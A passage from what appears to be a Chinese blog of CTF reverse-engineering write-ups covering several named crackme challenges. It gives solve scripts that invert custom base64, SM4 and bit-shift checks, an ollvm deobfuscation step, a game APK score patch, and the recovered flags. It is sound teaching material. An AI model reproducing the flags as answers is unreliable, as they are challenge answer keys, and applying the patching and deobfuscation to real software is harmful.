class="number">0x0B0EF2F50BE619F0</span>ll, <span class="number">0x4F0A3A064A35282B</span>ll&#125;;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line">        *((<span class="keyword">uint64_t</span> *)fflag+i)+=diff[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;fflag&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

## [rev][安洵杯 2019]crackMe

1. 程序使用了一些异常处理的手法

2. base64表进行了变换

3. 加密4个6位字符都+24了

4. 类base64编码之前还有个变换

5. 对于输入的变换：使用了SM4国密算法

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> random,string</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> pysm4 <span class="keyword">import</span> decrypt,encrypt</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;1UTAOIkpyOSWGv/mOYFY4R!!&#x27;</span></span><br><span class="line">tab = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/&#x27;</span></span><br><span class="line">rtab = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line">dic = &#123;&#125;</span><br><span class="line">dic[<span class="string">&#x27;=&#x27;</span>]=<span class="string">&#x27;=&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(tab)):</span><br><span class="line">    dic[tab[(i+<span class="number">24</span>)%<span class="number">64</span>]]=rtab[i]</span><br><span class="line">flag = flag.replace(<span class="string">&#x27;!&#x27;</span>,<span class="string">&#x27;=&#x27;</span>,<span class="number">-1</span>)</span><br><span class="line">rflag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(flag),<span class="number">2</span>):</span><br><span class="line">    rflag+=flag[i+<span class="number">1</span>]</span><br><span class="line">    rflag+=flag[i]</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> rflag:</span><br><span class="line">    flag+=dic[i]</span><br><span class="line">print(flag)</span><br><span class="line">flag = base64.b64decode(flag.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">flag = int.from_bytes(flag,<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">print(flag)</span><br><span class="line">v2=[<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>)]</span><br><span class="line">v2[<span class="number">0</span>] = <span class="number">0x77</span></span><br><span class="line">v2[<span class="number">1</span>] = <span class="number">0x68</span></span><br><span class="line">v2[<span class="number">2</span>] = <span class="number">0x65</span></span><br><span class="line">v2[<span class="number">3</span>] = <span class="number">0x72</span></span><br><span class="line">v2[<span class="number">4</span>] = <span class="number">0x65</span></span><br><span class="line">v2[<span class="number">5</span>] = <span class="number">0x5F</span></span><br><span class="line">v2[<span class="number">6</span>] = <span class="number">0x61</span></span><br><span class="line">v2[<span class="number">7</span>] = <span class="number">0x72</span></span><br><span class="line">v2[<span class="number">8</span>] = <span class="number">0x65</span></span><br><span class="line">v2[<span class="number">9</span>] = <span class="number">0x5F</span></span><br><span class="line">v2[<span class="number">10</span>] = <span class="number">0x75</span></span><br><span class="line">v2[<span class="number">11</span>] = <span class="number">0x5F</span></span><br><span class="line">v2[<span class="number">12</span>] = <span class="number">0x6E</span></span><br><span class="line">v2[<span class="number">13</span>] = <span class="number">0x6F</span></span><br><span class="line">v2[<span class="number">14</span>] = <span class="number">0x77</span></span><br><span class="line">v2[<span class="number">15</span>] = <span class="number">0x3F</span></span><br><span class="line">key = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(v2)):</span><br><span class="line">    key|=v2[i]&lt;&lt;((<span class="number">15</span>-i)*<span class="number">8</span>)</span><br><span class="line">res = decrypt(flag,key)</span><br><span class="line">print(res.to_bytes(<span class="number">16</span>,<span class="string">&#x27;big&#x27;</span>))</span><br></pre></td></tr></table></figure>

## [rev][2019红帽杯]childRE

1. 利用用户的输入建立一棵树(层序顺序)

2. 后续遍历1.建立的树

3. 使用UnDecorateSymbolName进行反修饰

4. 利用查表的方式替换outputString，逐一比对

outputString获取脚本

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">tab = <span class="string">&#x27;1234567890-=!@#$%^&amp;*()_+qwertyuiop[]QWERTYUIOP&#123;&#125;asdfghjkl;\x27ASDFGHJKL:&quot;ZXCVBNM&lt;&gt;?zxcvbnm,./&#x27;</span></span><br><span class="line">c1 = <span class="string">r&#x27;55565653255552225565565555243466334653663544426565555525555222&#x27;</span></span><br><span class="line">c2 = <span class="string">r&#x27;(_@4620!08!6_0*0442!@186%%0@3=66!!974*3234=&amp;0^3&amp;1@=&amp;0908!6_0*&amp;&#x27;</span></span><br><span class="line">ops = <span class="string">&#x27;&#x27;</span></span><br><span class="line">dic = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(tab)):</span><br><span class="line">    dic[tab[i]]=i</span><br><span class="line">ops = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">62</span>):</span><br><span class="line">    ops.append(dic[c1[i]]*<span class="number">23</span>+dic[c2[i]])</span><br><span class="line">print(ops)</span><br><span class="line">print(bytes(ops))</span><br></pre></td></tr></table></figure>

修饰代码

<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RopXX</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    RopXX() &#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">char</span> c;</span><br><span class="line">        My_Aut0_PWN(&amp;c);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">char</span>* __thiscall <span class="title">My_Aut0_PWN</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span>*)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, __FUNCDNAME__);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">new</span> RopXX();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

放入VS运行即可得到修饰后的字符串

?My_Aut0_PWN@RopXX@@QAEPADPAE@Z

根据后续遍历反向构造输入

Z0@tRAEyuP@xAAA?M_A0_WNPx@@EPDP

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(hashlib.md5(<span class="string">b&#x27;Z0@tRAEyuP@xAAA?M_A0_WNPx@@EPDP&#x27;</span>).hexdigest())</span><br></pre></td></tr></table></figure>

参考资料

[re | [2019红帽杯]childRE - Mz1 - 博客园](https://www.cnblogs.com/Mz1-rc/p/13769758.html) 最后那里由于粗心错了一位

[第18天：红帽杯2019-childRE_S1lenc3的博客-CSDN博客](https://blog.csdn.net/qq_41858371/article/details/103111366) 本篇博客提供了修饰代码

## [rev][MRCTF2020]PixelShooter

1. 找到Assemably-CSharp.dll，丢进dnspy

2. 直接一个一个类找，找到GameController，看到初始分数相关信息，把初始分数改到很大，击碎飞机得分改到很大

3. 重新编译apk，安装即可得到flag

其它c#逆向工具：ILSpy, dotpeek

## [rev]

使用IDA打开，发现是ollvm混淆过的，在GitHub上面找到deflat脚本

[GitHub - cq674350529/deflat: use angr to deobfuscation](https://github.com/cq674350529/deflat)

执行

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 deflat.py -f att --addr 0x400620</span><br></pre></td></tr></table></figure>

得到att_recovery，继续分析

删除无用语句，得到

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;defs.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">signed</span> __int64 v4;   <span class="comment">// [rsp+1E0h] [rbp-110h]</span></span><br><span class="line">    <span class="keyword">int</span> i;               <span class="comment">// [rsp+1E8h] [rbp-108h]</span></span><br><span class="line">    <span class="keyword">int</span> v6;              <span class="comment">// [rsp+1ECh] [rbp-104h]</span></span><br><span class="line">    <span class="keyword">int</span> v7;              <span class="comment">// [rsp+1ECh] [rbp-104h]</span></span><br><span class="line">    <span class="keyword">char</span> s1[<span class="number">48</span>];         <span class="comment">// [rsp+1F0h] [rbp-100h]</span></span><br><span class="line">    <span class="keyword">char</span> s[<span class="number">60</span>];          <span class="comment">// [rsp+220h] [rbp-D0h]</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> v10;    <span class="comment">// [rsp+25Ch] [rbp-94h]</span></span><br><span class="line">    <span class="keyword">char</span> *input;         <span class="comment">// [rsp+260h] [rbp-90h]</span></span><br><span class="line">    <span class="keyword">int</span> v12;             <span class="comment">// [rsp+26Ch] [rbp-84h]</span></span><br><span class="line">    <span class="keyword">bool</span> v13;            <span class="comment">// [rsp+272h] [rbp-7Eh]</span></span><br><span class="line">    <span class="keyword">unsigned</span> __int8 v14; <span class="comment">// [rsp+273h] [rbp-7Dh]</span></span><br><span class="line">    <span class="keyword">int</span> v15;             <span class="comment">// [rsp+274h] [rbp-7Ch]</span></span><br><span class="line">    <span class="keyword">char</span> *v16;           <span class="comment">// [rsp+278h] [rbp-78h]</span></span><br><span class="line">    <span class="keyword">int</span> v17;             <span class="comment">// [rsp+284h] [rbp-6Ch]</span></span><br><span class="line">    <span class="keyword">int</span> v18;             <span class="comment">// [rsp+288h] [rbp-68h]</span></span><br><span class="line">    <span class="keyword">bool</span> v19;            <span class="comment">// [rsp+28Fh] [rbp-61h]</span></span><br><span class="line">    <span class="keyword">char</span> *v20;           <span class="comment">// [rsp+290h] [rbp-60h]</span></span><br><span class="line">    <span class="keyword">int</span> v21;             <span class="comment">// [rsp+298h] [rbp-58h]</span></span><br><span class="line">    <span class="keyword">bool</span> v22;            <span class="comment">// [rsp+29Fh] [rbp-51h]</span></span><br><span class="line">    __int64 v23;         <span class="comment">// [rsp+2A0h] [rbp-50h]</span></span><br><span class="line">    <span class="keyword">bool</span> v24;            <span class="comment">// [rsp+2AFh] [rbp-41h]</span></span><br><span class="line">    __int64 v25;         <span class="comment">// [rsp+2B0h] [rbp-40h]</span></span><br><span class="line">    __int64 v26;         <span class="comment">// [rsp+2B8h] [rbp-38h]</span></span><br><span class="line">    __int64 v27;         <span class="comment">// [rsp+2C0h] [rbp-30h]</span></span><br><span class="line">    __int64 v28;         <span class="comment">// [rsp+2C8h] [rbp-28h]</span></span><br><span class="line">    <span class="keyword">int</span> v29;             <span class="comment">// [rsp+2D0h] [rbp-20h]</span></span><br><span class="line">    <span class="keyword">int</span> v30;             <span class="comment">// [rsp+2D4h] [rbp-1Ch]</span></span><br><span class="line">    <span class="keyword">char</span> *v31;           <span class="comment">// [rsp+2D8h] [rbp-18h]</span></span><br><span class="line">    <span class="keyword">int</span> v32;             <span class="comment">// [rsp+2E0h] [rbp-10h]</span></span><br><span class="line">    <span class="keyword">int</span> v33;             <span class="comment">// [rsp+2E4h] [rbp-Ch]</span></span><br><span class="line">    <span class="keyword">bool</span> v34;            <span class="comment">// [rsp+2EBh] [rbp-5h]</span></span><br><span class="line">    <span class="keyword">int</span> unk_402170;</span><br><span class="line">    v10 = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x30</span>uLL);</span><br><span class="line">    <span class="built_in">memset</span>(s1, <span class="number">0</span>, <span class="number">0x30</span>uLL);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Input:&quot;</span>, <span class="number">0L</span>L);</span><br><span class="line">    input = s;</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, input);</span><br><span class="line">    v6 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        v12 = v6;</span><br><span class="line">        v13 = v12 &lt; <span class="number">64</span>;</span><br><span class="line">        <span class="keyword">if</span> (!v13)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        v14 = s[v6];</span><br><span class="line">        v15 = v14;</span><br><span class="line">        <span class="keyword">if</span> (v15 == <span class="number">10</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            v16 = &amp;s[v6];</span><br><span class="line">            *v16 = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        v17 = v6 + <span class="number">1</span>;</span><br><span class="line">        v6 = v17;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>;; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        v18 = i;</span><br><span class="line">        v19 = v18 &lt; <span class="number">6</span>;</span><br><span class="line">        <span class="keyword">if</span> (!v19)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        v20 = s;</span><br><span class="line">        v4 = *(_QWORD *)&amp;v20[<span class="number">8</span> * i];</span><br><span class="line">        v7 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            v21 = v7;</span><br><span class="line">            v22 = v21 &lt; <span class="number">64</span>;</span><br><span class="line">            <span class="keyword">if</span> (!v22)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            v23 = v4;</span><br><span class="line">            <span class="keyword">if</span> (v4 &gt;= <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                v27 = v4;</span><br><span class="line">                v28 = <span class="number">2</span> * v27;</span><br><span class="line">                v4 = v28;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                v25 = <span class="number">2</span> * v4;</span><br><span class="line">                v26 = v25;</span><br><span class="line">                v4 = v26 ^ <span class="number">0xB0004B7679FA26B3</span>LL;</span><br><span class="line">            &#125;</span><br><span class="line">            v29 = v7;</span><br><span class="line">            v7 = v29 + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        v30 = <span class="number">8</span> * i;</span><br><span class="line">        v31 = &amp;s1[<span class="number">8</span> * i];</span><br><span class="line">        *(_QWORD *)v31 = v4;</span><br><span class="line">        *(_QWORD *)v31 = v4;</span><br><span class="line">        v32 = i + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v33 = <span class="built_in">memcmp</span>(s1, &amp;unk_402170, <span class="number">0x30</span>uLL);</span><br><span class="line">    v34 = v33 != <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (v34)</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Wrong!&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Correct!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> v10;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

分析写出逆向脚本

<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">rev</span><span class="params">(<span class="keyword">uint64_t</span> a)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;<span class="number">64</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(a&amp;<span class="number">1</span>)&#123;</span><br><span class="line">            a^=<span class="number">0xB0004B7679FA26B3</span>LL;</span><br><span class="line"></span><br><span class="line">            a&gt;&gt;=<span class="number">1</span>;</span><br><span class="line">            a|=(<span class="number">1L</span>L&lt;&lt;<span class="number">63</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            a&gt;&gt;=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%016llX\n&quot;</span>,a);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> a[] = &#123;<span class="number">0xbc8ff26d43536296</span>LL, <span class="number">0x520100780530ee16</span>LL, <span class="number">0x4dc0b5ea935f08ec</span>LL, <span class="number">0x342b90afd853f450</span>LL, <span class="number">0x8b250ebcaa2c3681</span>LL, <span class="number">0x55759f81a2c68ae4</span>LL, <span class="number">0xb0004b7679fa26b3</span>LL, <span class="number">0x25003a7475706e49</span>LL&#125;;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;<span class="number">6</span>;i++)&#123;</span><br><span class="line">        a[i] = rev(a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">char</span> s[<span class="number">49</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">memcpy</span>(s,a,<span class="number">48</span>);</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;s&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

flag&#123;6ff29390-6c20-4c56-ba70-a95758e3d1f8&#125;

## [rev][安洵杯 2019]game

1. IDA打开，发现被ollvm 混淆过了

2. 使用deflat把能去混淆的都去混淆

   函数功能

   - blank_num 返回0的数量

   - sudoku int[9][9]

   - mem_alloc 分配输入*48大小的内存

   - general_inspection 检测是否符合规则

   - check1 交换i,i+len/2的值

     然后i,i+1交换

     然后a[i]=(a[i]&amp;0xF3|~a[i]&amp;0xC)-20

   - check3 检查&amp;打印结果

   - check2 进行最后一步变换(转化为数字)并且检查和sudoku数组是否相等

3. 最后一个trace无法deflat，~~手撸~~ 发现可以直接调试

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printArray</span><span class="params">(<span class="keyword">char</span> *name,<span class="keyword">uint8_t</span> *data,<span class="keyword">size_t</span> len)</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;==============%s========\n&quot;</span>,name);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%02x,&quot;</span>,data[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n================================\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">calc</span><span class="params">(<span class="keyword">uint32_t</span> d1,<span class="keyword">uint32_t</span> d2,<span class="keyword">uint32_t</span> d3,<span class="keyword">uint32_t</span> d4)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> d1*d1*d2+d1*d3+d4;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">uint8_t</span> sudoku[] = &#123;<span class="number">1</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">8</span>,<span class="number">3</span>,<span class="number">9</span>,<span class="number">6</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">1</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">6</span>,<span class="number">1</span>,<span class="number">8</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>,<span 